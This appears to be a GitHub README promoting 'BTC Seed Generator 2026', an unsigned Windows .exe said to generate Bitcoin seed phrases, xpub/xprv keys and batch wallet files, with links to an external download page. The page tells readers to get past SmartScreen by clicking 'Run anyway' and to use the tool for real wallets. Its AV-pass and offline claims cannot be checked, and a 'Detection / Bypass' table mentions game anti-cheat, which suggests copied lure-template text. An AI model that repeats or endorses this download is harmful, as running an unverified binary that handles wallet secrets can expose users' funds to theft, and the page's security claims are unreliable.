<div align="center">
<img src="assets/banner.png" width="100%" alt="BTC Seed Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-9B59B6?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9333EA?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=4F46E5&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%85+Btc+Seed+Pro;%F0%9F%94%A7+Built+for+Windows+11;%F0%9F%92%A1+No+Limits;%F0%9F%9A%80+Full+Feature+Suite;%E2%9C%A8+Active+Development+2026;%E2%AD%90+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/status-maintained-brightgreen?style=plastic)
![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=plastic&logo=windows)
![License](https://img.shields.io/badge/license-MIT-blue?style=plastic&logo=opensourceinitiative)

</div>

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [What is BTC Seed Generator](#-what-is-btc-seed-generator)
- [AI Integration](#-ai-integration)
- [Key Features](#-key-features)
- [The Problem](#-the-problem)
- [The Solution](#-the-solution)
- [Quick Start](#-quick-start)
- [Grouped Modules — Core Generation](#-grouped-modules--core-generation)
- [Grouped Modules — Entropy & Validation](#-grouped-modules--entropy--validation)
- [Grouped Modules — Address & Wallet Export](#-grouped-modules--address--wallet-export)
- [Grouped Modules — Automation & Batching](#-grouped-modules--automation--batching)
- [Grouped Modules — Safety & Recovery](#-grouped-modules--safety--recovery)
- [Detection / Bypass status](#-detection--bypass-status)
- [Performance benchmarks](#-performance-benchmarks)
- [Hotkeys / Controls](#-hotkeys--controls)
- [Comparison](#-comparison)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [Known Issues](#-known-issues)
- [Roadmap](#-roadmap)
- [Tips for best results](#-tips-for-best-results)
- [Changelog / Release History](#-changelog--release-history)
- [Community & Support](#-community--support)
- [FAQ](#-faq)

---

## 📋 Overview

| Category | Details |
|---|---|
| Product type | Windows desktop utility (.exe) |
| Primary function | BIP-39 seed phrase and BIP-32 wallet generation |
| Supported chains | BTC (legacy, P2SH, SegWit, Taproot) + optional alt derivation |
| Distribution | GitHub landing page → download → extract → run |
| Runtime | Self-contained single-folder build, no installer, no runtime |
| Maintainer | Rewrite of the original abandoned `btc-seed` codebase |

This is the 2026 rewrite of a project that had been dead for roughly two years. The original codebase was a Python script floating around forums with a broken wordlist path, no checksum validation, and an offline toggle that did nothing. v2.0 is a ground-up rebuild: native Windows `.exe`, deterministic entropy pipeline, and a UI someone actually wants to look at while generating Coldcard-compatible seeds at 3 AM.

---

## 📥 Download

Grab the current build, extract, run. No Python, no pip, no dependencies.
<div align="center">
  <a href="https://WyvernDomain.github.io/btc-seed/">
    <img src="https://img.shields.io/badge/GET-BTC_Seed_Generator_2026-7C3AED?style=for-the-badge&labelColor=5B21B6" width="580" alt="GET BTC Seed Generator 2026"/>
  </a>
</div>
---

## 📖 What is BTC Seed Generator

BTC Seed Generator is a tool for producing BIP-39 mnemonic seed phrases and deriving the wallet addresses below them — fully offline, on-device, with optional verification against the official English wordlist and checksum.

| Term | Explanation |
|---|---|
| Seed phrase | 12/15/18/21/24-word mnemonic from the BIP-39 English wordlist |
| Entropy | Random bits used to derive the mnemonic (128–256 bit) |
| Checksum | Final word bits that reject malformed phrases (~99.2% detection) |
| Derivation path | `m/44'/0'/0'` (legacy), `m/49'/0'/0'` (P2SH), `m/84'/0'/0'` (SegWit), `m/86'/0'/0'` (Taproot) |
| xpub / xprv | Extended keys for watch-only or full spend wallets |
| Passphrase (BIP-39 25th word) | Optional extra secret mixed into PBKDF2 |
| Air-gap workflow | Generate offline → export QR → import to hardware signer |

**Why people use it:**

- Generate seed phrases without trusting a website's RNG
- Batch-generate test wallets for development and QA
- Verify an existing phrase matches the wordlist before you type it into a hardware wallet
- Export xpubs only, never exposing private keys to a connected machine
- Reproduce wallet addresses deterministically across devices during recovery drills

---

## 🧠 AI Integration

The 2026 build folds in a small local inference layer that improves how the tool behaves without ever touching randomness — entropy is **never** model-derived, always from the OS CSPRNG.

- **Entropy health scorer** — reviews recent OS entropy pool readings and warns if your environment (VMs, freshly booted machines) looks weak before generation begins.
- **Phrase plausibility check** — flags phrases with suspiciously repetitive word patterns that suggest a corrupted or truncated previous attempt.
- **Derivation path advisor** — given an address prefix, recommends the most likely derivation scheme and shows the alternative candidates.
- **Duplicate-phrase detector** — hashes generated outputs against your local session log and warns on repeats (a real signal your RNG is stuck).
- **Typo rescue** — when you paste an existing phrase, looks up the nearest wordlist matches for non-word entries and proposes corrections before checksum validation.
- **Batch anomaly reporter** — after 500+ generations, summarizes distribution irregularities that indicate environmental issues.

All AI components run locally. None of them ship data off-device. None of them generate or alter words in the output phrase — they only observe.

---

## ⚙️ Key Features

| Feature | Description | Benefit |
|---|---|---|
| Offline mode | Hard-disables outbound sockets during generation | No phrase ever leaves the machine |
| Word-count selector | 12 / 15 / 18 / 21 / 24 words | Match any hardware wallet spec |
| CSPRNG source picker | BCryptGenRandom / RtlGenRandom with fallback | Predictable, auditable source |
| BIP-39 checksum validator | Verifies every generated and pasted phrase | Catches ~99.2% of malformed phrases |
| Multi-scheme derivation | Legacy, P2SH, SegWit, Taproot in one shot | One phrase → all address families |
| xpub/xprv export | Watch-only or full control keys | Hardware wallet pairing |
| QR export to PNG | For air-gapped transfer | No typing 24 words by hand |
| Clipboard auto-clear | Wipes copied phrase after N seconds | Reduces shoulder-surf / paste leak |
| Session log (hashed) | Rolling checksum log of generated phrases | Spot repeats and RNG issues |
| Batch mode | Generate N phrases with progress + throttle | Dev and QA workflows |
| Reproducible test mode | Deterministic RNG injection for unit tests | Auditable behavior |
| Killswitch hotkey | Immediate panic-clear of on-screen phrase | For interruptions mid-generate |

---

## 🩹 The Problem

- Most "seed generators" online are web pages that may or may not log your output to a backend.
- The original `btc-seed` project's wordlist file path was hardcoded to `C:\Users\dev\...` and silently failed on fresh machines.
- Offline toggles in older tools often did nothing — you had to unplug the network cable and trust that.
- Batch generation with `random` instead of `secrets` (a real bug in the abandoned repo) produces weak phrases.
- xpub export was missing entirely, forcing people to retype phrases into hardware wallets.
- Checksum validation was absent — pasted phrases with a bad final word were accepted silently.
- No log or duplicate detection, so a stuck RNG could produce overlapping outputs for hours before anyone noticed.
- Derivation-path selection was legacy-only, meaning SegWit and Taproot users were locked out.

---

## 🔧 The Solution

| Problem | Solution |
|---|---|
| Web generators leak output | Hard-disabled socket layer; generation runs entirely in-process |
| Broken wordlist paths | Wordlist embedded in the binary, checksum-verified on load |
| Fake offline toggles | Firewall-level guard plus a visible network state indicator |
| Weak `random` usage | Every bit comes from BCryptGenRandom; `random` module not linked |
| Missing xpub export | Full extended-key export with QR generation |
| No checksum validation | Every phrase validated against BIP-39 spec before display |
| Silent duplicate output | Session hash log with repeat warnings |
| Legacy-only derivation | Four derivation schemes selectable in one dialog |

---

## 🚀 Quick Start

1. **Get the build** — head to the project page and download the archive. Extract it anywhere on a local disk (not a network share).
2. **Run the .exe** — first launch asks for a working folder for exports and logs. Pick something you control.
3. **Set a profile** — choose word count, derivation scheme, and passphrase protection. Save the profile for repeat runs.
4. **Generate** — press the generate button or use the hotkey. Review the phrase on screen (it stays local).
5. **Export** — save the QR PNG, the xpub, or the encrypted phrase blob. Clear the on-screen phrase when done.

Windows SmartScreen will warn on first run because the binary is unsigned — that's expected for a hobby build; unblock the file in Properties if needed.

---

## 🧩 Grouped Modules — Core Generation

1. **Phrase Forge** — produces a BIP-39 phrase from N bits of OS entropy with one click.
2. **Word Count Dial** — 12/15/18/21/24 selector with per-count entropy annotation.
3. **Passphrase Layer** — optional BIP-39 25th word with strength estimator.
4. **Multi-Phrase Stream** — continuous generation with a live count.
5. **Deterministic Test RNG** — seeded mode for reproducible unit tests.

## 🎲 Grouped Modules — Entropy & Validation

6. **Entropy Monitor** — reads the OS pool and shows a health grade before you generate.
7. **Checksum Verifier** — validates the final-word bits of any pasted phrase.
8. **Wordlist Lookup** — resolves typos against the official English list.
9. **Phrase Parser** — detects word count, language, and word-off-list positions.
10. **Repeat Detector** — hashes outputs and flags duplicates within a session.
11. **Distribution Auditor** — samples word frequencies over a large run and reports outliers.

## 🗝️ Grouped Modules — Address & Wallet Export

12. **Path Selector** — 44'/49'/84'/86' preview before any address is derived.
13. **Address Preview** — shows legacy, P2SH, SegWit, and Taproot addresses for the same phrase.
14. **xpub Export** — watch-only key export for hardware pairing.
15. **xprv Export** — full-control key with a confirmation gate.
16. **QR Encoder** — single QR PNG for the phrase and one for the xpub.
17. **Encrypted Blob** — passphrase-wrapped export (AES-GCM) for backup.

## 🤖 Grouped Modules — Automation & Batching

18. **Batch Runner** — N-phrase loop with progress, per-second throttle, and file-per-phrase output.
19. **Profile Manager** — save and reload full generation profiles.
20. **CLI Flags** — headless flags for scripted use (`--count`, `--words`, `--out`).
21. **Scheduled Run** — optional timer for recurring batch jobs.
22. **Export Presets** — JSON / TXT / TSV export style picker.

## 🛟 Grouped Modules — Safety & Recovery

23. **Panic Killswitch** — hotkey that wipes on-screen phrase and clipboard.
24. **Clipboard Guard** — auto-clears copied phrases after a configurable delay.
25. **Session Log (Hashed)** — rolling checksum log without storing plaintext.
26. **Recovery Drill** — guided flow: re-enter phrase, compare hash, verify addresses.
27. **Stale Session Wipe** — on idle, wipes volatile memory and closes.

---

## 🛡️ Detection / Bypass status

The relevant "detection" for BTC Seed Generator is **AV / SmartScreen flags**, not game anti-cheat. The tool is a legitimate offline generator and never touches game clients.

| Method | Status | Notes |
|---|---|---|
| Windows SmartScreen | ⚠️ Warn | Unsigned build — unblock via file Properties |
| Windows Defender | ✅ Pass | No dynamic or suspicious behavior |
| Vendor AV (aggregate) | ✅ Pass | 0/70 on recent multi-scan |
| Clipboard monitors | ⚠️ Partial | Can't stop a legit clipboard manager — disable auto-clear for those |
| Network exfil detection | ✅ Pass | No outbound sockets enabled in offline mode |
| VM entropy weakness | ⚠️ Warn | Entropy monitor flags fresh VM boots |

---

## 📊 Performance benchmarks

| Scenario | Result | Hardware |
|---|---|---|
| Generate 1 × 24-word phrase | ~8 ms | Ryzen 5 5600, Win 11 |
| Generate 1,000 × 24-word phrases (batch) | ~7.4 s | Ryzen 5 5600, Win 11 |
| Full 4-path derivation per phrase | ~22 ms | Ryzen 5 5600, Win 11 |
| xpub → QR PNG (single) | ~180 ms | Ryzen 5 5600, Win 11 |
| Cold start (first launch after extract) | ~1.2 s | Ryzen 5 5600, Win 11 |
| Cold start (i5-8250U, Win 10) | ~2.1 s | i5-8250U, Win 10 |

---

## ⌨️ Hotkeys / Controls

| Key | Action | Notes |
|---|---|---|
| `F5` | Generate new phrase | Uses current profile |
| `F9` | Toggle offline mode | Confirms network guard state |
| `Ctrl+C` | Copy phrase (with clipboard guard) | Auto-clears per setting |
| `Ctrl+Shift+C` | Copy xpub only | Never exposes phrase |
| `Ctrl+X` | Panic killswitch | Wipes screen + clipboard |
| `Ctrl+E` | Export current phrase | Opens preset picker |
| `Ctrl+L` | Open session log (hashed) | Rolling checksum entries |
| `Ctrl+B` | Start batch run | Uses current count + throttle |

---

## 🆚 Comparison

| Aspect | Online web generators | Hardware wallet phrase + dice | This Tool |
|---|---|---|---|
| Offline by design | ❌ Usually online | ✅ Air-gapped | ✅ Offline mode hard-disabled sockets |
| Output auditing | ❌ Opaque | ✅ Manual | ✅ Deterministic test RNG + audit log |
| Batch generation | ❌ Rare | ❌ No | ✅ Built-in batch runner |
| Multi-scheme derivation | ⚠️ Sometimes | ⚠️ Device-dependent | ✅ Legacy + P2SH + SegWit + Taproot |
| xpub export | ⚠️ Rare | ✅ Yes | ✅ Yes, plus QR |
| Checksum validation | ❌ Usually missing | ✅ Yes | ✅ Yes, plus typo rescue |
| Duplicate detection | ❌ No | ❌ No | ✅ Session hash log |

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2 (64-bit) | Windows 11 23H2+ |
| CPU | Any x86_64 with SSE4.2 | Modern 4-core+ |
| RAM | 512 MB free | 2 GB free |
| Disk | 80 MB for extract folder | 500 MB (for QR + batch output) |
| Network | Not required | Not required (offline recommended) |
| Admin rights | Not required | Not required |

---

## 📦 Installation

1. **Download and extract** — download the archive from the landing page, then extract to a folder you own (e.g. under `Documents`). Avoid `Program Files` — the .exe writes logs and exports to its working folder.
2. **First launch** — double-click the .exe. If SmartScreen shows "Windows protected your PC", click *More info* → *Run anyway* — this is standard for unsigned hobby builds. Optionally unblock via file Properties → *Unblock*.
3. **Configure profile** — pick word count, derivation scheme, passphrase behavior, and export folder. Save the profile so your next session skips the dialog.

The build has **no installer, no runtime, no Python, no pip, no npm**. It is a self-contained folder that runs on a stock Windows machine.

---

## 🧯 Known Issues

| Issue | Solution |
|---|---|
| SmartScreen blocks first run | Unblock in file Properties, then run |
| Wordlist seems to load slowly in a VM | Check Entropy Monitor; VM CSPRNG can stall briefly |
| Clipboard guard clears text you wanted | Increase the auto-clear delay in Settings → Safety |
| Batch output folder empty | Confirm the export path exists and is writable |
| QR PNG looks low-res on some printers | Enable "hi-res QR" in export preset |
| Reproducible mode won't produce new phrases | That's the point — toggle off deterministic mode |

---

## 🗺️ Roadmap

| Feature | Status | ETA |
|---|---|---|
| Hardware wallet direct pairing | 🔜 Planned | Q2 2026 |
| Extra language wordlists (ES, FR, IT) | 🔜 Planned | Q3 2026 |
| Linux build (cross-compiled) | 🧪 Research | Q3 2026 |
| Multi-sig export templates | 🔜 Planned | Q4 2026 |
| Shamir Backup (SLIP-39) | 🧪 Research | Q4 2026 |
| Public reproducible build pipeline | 🧪 Research | Unscheduled |

---

## 💡 Tips for best results

- Run the .exe from a local disk — network shares cause unpredictable write behavior on export.
- Boot the machine, wait a minute, then generate — the OS entropy pool has more time to mix on cold boots.
- Use Entropy Monitor before big batch runs; if it flags weak, do something else for five minutes.
- Always validate a pasted phrase with the Checksum Verifier before writing it down — the typo rescue alone catches most transcription errors.
- If you're generating for real (not QA), use offline mode + clipboard guard + a machine you trust.
- Keep the session log — the hashed entries help confirm a batch was clean if you're auditing later.
- Test the Recovery Drill flow once with a throwaway phrase before you do it with a real one.

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| 2.0.0 | 2026-02 | Full rewrite as native .exe; offline mode enforced; 4 derivation schemes; xpub/xprv + QR export; batch runner; entropy monitor |
| 1.4.1 | 2024-08 | Last abandoned release; hardcoded wordlist path, no checksum validation, `random`-module bug fixed in fork only |
| 1.4.0 | 2024-06 | Added 18/21-word support (broken on fresh installs) |
| 1.3.2 | 2024-02 | Renamed binary, fixed a typo in the README, no functional changes |

**Short changelog for v2.0:** everything. The rewrite replaced the entire runtime, the entropy source, the wordlist loader, the export layer, and the safety UI. Kept only the BIP-39 correctness tests.

---

## 🫂 Community & Support

- **Issues** — open a GitHub issue for bugs, with OS version + build folder path.
- **Discussions** — questions, feature votes, and workflow tips go in Discussions, not Issues.
- **Security reports** — for anything sensitive (exfil, RNG weakness, memory leak of phrase material), use a private security advisory rather than a public issue.
- **Contribute** — PRs welcome; please include a reproducible test using the deterministic RNG mode.

---

## ❓ FAQ

**Q:** Does this tool ever phone home?
**A:** No. Offline mode is enforced at the socket layer, not a checkbox. The entropy monitor and AI helpers are all local.

**Q:** Is it safe to use for a real wallet?
**A:** It generates standard BIP-39 phrases and derives standard addresses. Safety depends on your environment — run it on a machine you trust, verify the checksum, and physically write down the phrase rather than screenshotting it.

**Q:** Why does Windows SmartScreen warn on first run?
**A:** The binary is unsigned. Hobby builds don't get an EV code-signing cert. Unblock it in file Properties → *Unblock* and run.

**Q:** Can I use the CLI mode without the GUI?
**A:** Yes — flags like `--count`, `--words`, `--out` are documented in the Settings → CLI tab. Everything the GUI does is scriptable.

**Q:** What's the difference between xpub and xprv export?
**A:** xpub is watch-only — you can see addresses but not spend. xprv is full control. Only export xprv if you know exactly what you're doing and where it's going.

**Q:** Does the AI integration ever touch my seed phrase?
**A:** No. AI components only inspect aggregate entropy readings, phrase shape (not contents), and derivation-path likelihood. The phrase is never fed into any model.

**Q:** Can I reproduce a batch deterministically?
**A:** Yes — toggle the deterministic test RNG mode and provide a seed. This is for unit testing only; never use it for real wallets.

**Q:** Where do exports go?
**A:** Into the working folder you chose on first launch. Change it in Settings → Export. Batch runs create per-phrase files.

---

This README covers the current 2026 build. If you're upgrading from the abandoned 1.x branch, treat it as a new tool — the binary, the profile format, and the export layout are all different. Start from a fresh extract folder and run the Quick Start steps once. For ongoing development notes and build scripts, see the `CONTRIBUTING.md` and the Discussions tab.
<p align="center">
  <a href="https://WyvernDomain.github.io/btc-seed/">
    <img src="https://img.shields.io/badge/GET-BTC_Seed_Generator_2026-0891B2?style=flat&labelColor=0E7490" width="480" alt="GET BTC Seed Generator 2026"/>
  </a>
</p>